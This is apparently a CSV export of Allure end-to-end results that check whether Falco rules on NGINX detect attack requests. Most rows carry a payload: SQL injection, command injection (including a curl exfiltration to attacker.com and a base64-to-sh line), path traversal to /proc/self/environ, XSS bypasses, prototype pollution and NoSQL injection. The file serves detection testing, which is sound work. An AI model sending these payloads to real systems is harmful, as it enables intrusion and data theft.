"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_005` |
| **Name** | Process environment variables access |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/proc/self/environ`
- **Encoded**: `/proc/self/environ`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~65000ms
- **Timestamp**: 13:54:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_005-1770818047910-z6xyuc pattern_id=PATH_ABS_005 uri=/?q=/proc/self/environ client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_005-1770818047910-z6xyuc pattern_id=PATH_ABS_005 uri=/?q=/proc/self/environ client=127.0.0.1

**Falco Log Entry**:
```
13:54:07.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_005-1770818047910-z6xyuc pattern_id=PATH_ABS_005 uri=/?q=/proc/self/environ client=127.0.0.1
```","2","test_e2e_with_logs[210_PATH_ABS_005]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_001` |
| **Name** | URL encoded whoami command |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%3Bwhoami`
- **Encoded**: `%253Bwhoami`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 13:54:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_ENC_001-1770818055418-v4csek pattern_id=CMD_ENC_001 uri=/?q=%253Bwhoami client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENC_001-1770818055418-v4csek pattern_id=CMD_ENC_001 uri=/?q=%253Bwhoami client=127.0.0.1

**Falco Log Entry**:
```
13:54:15.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENC_001-1770818055418-v4csek pattern_id=CMD_ENC_001 uri=/?q=%253Bwhoami client=127.0.0.1
```","1","test_e2e_with_logs[326_CMD_ENC_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_002` |
| **Name** | Database name length discovery |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT LENGTH(database()))>5 --`
- **Encoded**: `%27%20AND%20%28SELECT%20LENGTH%28database%28%29%29%29%3E5%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~64000ms
- **Timestamp**: 13:54:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_002-1770818048436-y9jtjl pattern_id=SQLI_BLIND_002 uri=/?q=%27%20AND%20%28SELECT%20LENGTH%28database%28%29%29%29%3E5%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_002-1770818048436-y9jtjl pattern_id=SQLI_BLIND_002 uri=/?q=%27%20AND%20%28SELECT%20LENGTH%28database%28%29%29%29%3E5%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:08.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_002-1770818048436-y9jtjl pattern_id=SQLI_BLIND_002 uri=/?q=%27%20AND%20%28SELECT%20LENGTH%28database%28%29%29%29%3E5%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[023_SQLI_BLIND_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_UNION_007` |
| **Name** | File write via INTO OUTFILE |
| **Category** | SQLI |
| **Subcategory** | union_based |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt' --`
- **Encoded**: `%27%20UNION%20SELECT%201%2C2%2C3%20INTO%20OUTFILE%20%27%2Ftmp%2Ftest.txt%27%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 13:54:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_007-1770818052445-79aum pattern_id=SQLI_UNION_007 uri=/?q=%27%20UNION%20SELECT%201%2C2%2C3%20INTO%20OUTFILE%20%27%2Ftmp%2Ftest.txt%27%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_007-1770818052445-79aum pattern_id=SQLI_UNION_007 uri=/?q=%27%20UNION%20SELECT%201%2C2%2C3%20INTO%20OUTFILE%20%27%2Ftmp%2Ftest.txt%27%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:12.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_007-1770818052445-79aum pattern_id=SQLI_UNION_007 uri=/?q=%27%20UNION%20SELECT%201%2C2%2C3%20INTO%20OUTFILE%20%27%2Ftmp%2Ftest.txt%27%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[122_SQLI_UNION_007]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_SUB_005` |
| **Name** | Root directory listing via substitution |
| **Category** | CMDINJ |
| **Subcategory** | command_substitution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$(ls -la /root)`
- **Encoded**: `%24%28ls%20-la%20%2Froot%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 13:54:20.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_SUB_005-1770818060432-k7q02o pattern_id=CMD_SUB_005 uri=/?q=%24%28ls%20-la%20%2Froot%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_SUB_005-1770818060432-k7q02o pattern_id=CMD_SUB_005 uri=/?q=%24%28ls%20-la%20%2Froot%29 client=127.0.0.1

**Falco Log Entry**:
```
13:54:20.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_SUB_005-1770818060432-k7q02o pattern_id=CMD_SUB_005 uri=/?q=%24%28ls%20-la%20%2Froot%29 client=127.0.0.1
```","1","test_e2e_with_logs[366_CMD_SUB_005]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_012` |
| **Name** | EXISTS subquery injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR EXISTS(SELECT 1) --`
- **Encoded**: `'%20OR%20EXISTS(SELECT%201)%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~50000ms
- **Timestamp**: 13:54:22.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_012-1770818062472-kuqs08 pattern_id=SQLI_BOOL_012 uri=/?q='%20OR%20EXISTS(SELECT%201)%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_012-1770818062472-kuqs08 pattern_id=SQLI_BOOL_012 uri=/?q='%20OR%20EXISTS(SELECT%201)%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:22.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_012-1770818062472-kuqs08 pattern_id=SQLI_BOOL_012 uri=/?q='%20OR%20EXISTS(SELECT%201)%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[043_SQLI_BOOL_012]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_009` |
| **Name** | Network interface configuration |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `; ifconfig`
- **Encoded**: `%3B%20ifconfig`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~65000ms
- **Timestamp**: 13:54:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_009-1770818047397-y09ed8 pattern_id=CMD_BASIC_009 uri=/?q=%3B%20ifconfig client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_009-1770818047397-y09ed8 pattern_id=CMD_BASIC_009 uri=/?q=%3B%20ifconfig client=127.0.0.1

**Falco Log Entry**:
```
13:54:07.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_009-1770818047397-y09ed8 pattern_id=CMD_BASIC_009 uri=/?q=%3B%20ifconfig client=127.0.0.1
```","2","test_e2e_with_logs[308_CMD_BASIC_009]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_009` |
| **Name** | Template string polyglot |
| **Category** | XSS |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: ``alert('XSS')``
- **Encoded**: `%60alert%28%27XSS%27%29%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~44000ms
- **Timestamp**: 13:54:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=XSS_POLY_009-1770818068477-t8g226 pattern_id=XSS_POLY_009 uri=/?q=%60alert%28%27XSS%27%29%60 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=XSS_POLY_009-1770818068477-t8g226 pattern_id=XSS_POLY_009 uri=/?q=%60alert%28%27XSS%27%29%60 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:28.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=XSS_POLY_009-1770818068477-t8g226 pattern_id=XSS_POLY_009 uri=/?q=%60alert%28%27XSS%27%29%60 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[184_XSS_POLY_009]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ENC_002` |
| **Name** | Unicode escaped script tag |
| **Category** | XSS |
| **Subcategory** | encoding_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `\u003cscript\u003ealert(1)\u003c/script\u003e`
- **Encoded**: `%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~71000ms
- **Timestamp**: 13:54:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_002-1770818041410-nnvei pattern_id=XSS_ENC_002 uri=/?q=%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_002-1770818041410-nnvei pattern_id=XSS_ENC_002 uri=/?q=%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:01.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_002-1770818041410-nnvei pattern_id=XSS_ENC_002 uri=/?q=%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[164_XSS_ENC_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PP_CONSTR_001` |
| **Name** | Constructor.prototype Pollution |
| **Category** | PROTOTYPE_POLLUTION |
| **Subcategory** | constructor |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `?constructor[prototype][polluted]=true`
- **Encoded**: `%3Fconstructor%5Bprototype%5D%5Bpolluted%5D%3Dtrue`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~18000ms
- **Timestamp**: 13:54:54.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX PP] Prototype pollution attack attempt` |
| **Matched Rule** | `[NGINX PP] Prototype pollution attack attempt test_id=PP_CONSTR_001-1770818094892-wa8aem pattern_id=PP_CONSTR_001 uri=/?q=%3Fconstructor%5Bprototype%5D%5Bpolluted%5D%3Dtrue client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX PP] Prototype pollution attack attempt test_id=PP_CONSTR_001-1770818094892-wa8aem pattern_id=PP_CONSTR_001 uri=/?q=%3Fconstructor%5Bprototype%5D%5Bpolluted%5D%3Dtrue client=127.0.0.1

**Falco Log Entry**:
```
13:54:54.000000000: Warning [NGINX PP] Prototype pollution attack attempt test_id=PP_CONSTR_001-1770818094892-wa8aem pattern_id=PP_CONSTR_001 uri=/?q=%3Fconstructor%5Bprototype%5D%5Bpolluted%5D%3Dtrue client=127.0.0.1
```","1","test_e2e_with_logs[399_PP_CONSTR_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_BYPASS_001` |
| **Name** | Nested script tag bypass |
| **Category** | XSS |
| **Subcategory** | filter_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<scr<script>ipt>alert('XSS')</script>`
- **Encoded**: `%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C%2Fscript%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~69000ms
- **Timestamp**: 13:54:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_001-1770818043916-8kqwk pattern_id=XSS_BYPASS_001 uri=/?q=%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C%2Fscript%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_001-1770818043916-8kqwk pattern_id=XSS_BYPASS_001 uri=/?q=%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C%2Fscript%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:03.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_001-1770818043916-8kqwk pattern_id=XSS_BYPASS_001 uri=/?q=%3Cscr%3Cscript%3Eipt%3Ealert('XSS')%3C%2Fscript%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[135_XSS_BYPASS_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_006` |
| **Name** | Details tag XSS |
| **Category** | XSS |
| **Subcategory** | mutation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<details open ontoggle=alert('XSS')>`
- **Encoded**: `%3Cdetails%20open%20ontoggle%3Dalert('XSS')%3E`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[171_XSS_MUT_006]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_003` |
| **Name** | Out-of-band data exfiltration via curl |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `| curl http://attacker.com/callback?data=`whoami``
- **Encoded**: `%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~56000ms
- **Timestamp**: 13:54:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_BLIND_003-1770818056923-e8a4ee pattern_id=CMD_BLIND_003 uri=/?q=%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_003-1770818056923-e8a4ee pattern_id=CMD_BLIND_003 uri=/?q=%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60 client=127.0.0.1

**Falco Log Entry**:
```
13:54:16.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_003-1770818056923-e8a4ee pattern_id=CMD_BLIND_003 uri=/?q=%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60 client=127.0.0.1
```","2","test_e2e_with_logs[323_CMD_BLIND_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DBL_004` |
| **Name** | Double encoded Windows-style traversal |
| **Category** | PATH |
| **Subcategory** | double_encoded |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%252E%252E%255C`
- **Encoded**: `%25252E%25252E%25255C`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~44000ms
- **Timestamp**: 13:54:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Encoded path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Encoded path traversal attack detected test_id=PATH_DBL_004-1770818068461-eb5xj9 pattern_id=PATH_DBL_004 uri=/?q=%25252E%25252E%25255C client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_DBL_004-1770818068461-eb5xj9 pattern_id=PATH_DBL_004 uri=/?q=%25252E%25252E%25255C client=127.0.0.1

**Falco Log Entry**:
```
13:54:28.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_DBL_004-1770818068461-eb5xj9 pattern_id=PATH_DBL_004 uri=/?q=%25252E%25252E%25255C client=127.0.0.1
```","1","test_e2e_with_logs[237_PATH_DBL_004]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASH_005` |
| **Name** | Path environment variable access |
| **Category** | CMDI |
| **Subcategory** | bash_specific |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `&& bash -c 'echo $PATH'`
- **Encoded**: `%26%26%20bash%20-c%20%27echo%20%24PATH%27`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 13:54:40.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_005-1770818080483-iv4ing pattern_id=CMD_BASH_005 uri=/?q=%26%26%20bash%20-c%20%27echo%20%24PATH%27 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_005-1770818080483-iv4ing pattern_id=CMD_BASH_005 uri=/?q=%26%26%20bash%20-c%20%27echo%20%24PATH%27 client=127.0.0.1

**Falco Log Entry**:
```
13:54:40.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_005-1770818080483-iv4ing pattern_id=CMD_BASH_005 uri=/?q=%26%26%20bash%20-c%20%27echo%20%24PATH%27 client=127.0.0.1
```","1","test_e2e_with_logs[300_CMD_BASH_005]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_OBF_008` |
| **Name** | Base64 Decode Execution |
| **Category** | CMDINJ |
| **Subcategory** | obfuscation |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;echo d2hvYW1p | base64 -d | sh`
- **Encoded**: `%3Becho%20d2hvYW1p%20%7C%20base64%20-d%20%7C%20sh`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","1","test_e2e_with_logs[348_CMD_OBF_008]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_002` |
| **Name** | MongoDB not-equal operator bypass |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""$ne"": null}`
- **Encoded**: `%7B%22%24ne%22%3A%20null%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~64000ms
- **Timestamp**: 13:54:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_002-1770818048889-ke19tv pattern_id=EMRG_MONGO_002 uri=/?q=%7B%22%24ne%22%3A%20null%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_002-1770818048889-ke19tv pattern_id=EMRG_MONGO_002 uri=/?q=%7B%22%24ne%22%3A%20null%7D client=127.0.0.1

**Falco Log Entry**:
```
13:54:08.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_002-1770818048889-ke19tv pattern_id=EMRG_MONGO_002 uri=/?q=%7B%22%24ne%22%3A%20null%7D client=127.0.0.1
```","1","test_e2e_with_logs[445_EMRG_MONGO_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_002` |
| **Name** | Polyglot script/style |
| **Category** | XSS |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `</style><script>alert(1)</script><style>`
- **Encoded**: `%3C%2Fstyle%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Cstyle%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~54000ms
- **Timestamp**: 13:54:18.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_002-1770818058451-cwy9i9 pattern_id=XSS_POLY_002 uri=/?q=%3C%2Fstyle%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Cstyle%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_002-1770818058451-cwy9i9 pattern_id=XSS_POLY_002 uri=/?q=%3C%2Fstyle%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Cstyle%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:18.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_002-1770818058451-cwy9i9 pattern_id=XSS_POLY_002 uri=/?q=%3C%2Fstyle%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Cstyle%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[177_XSS_POLY_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
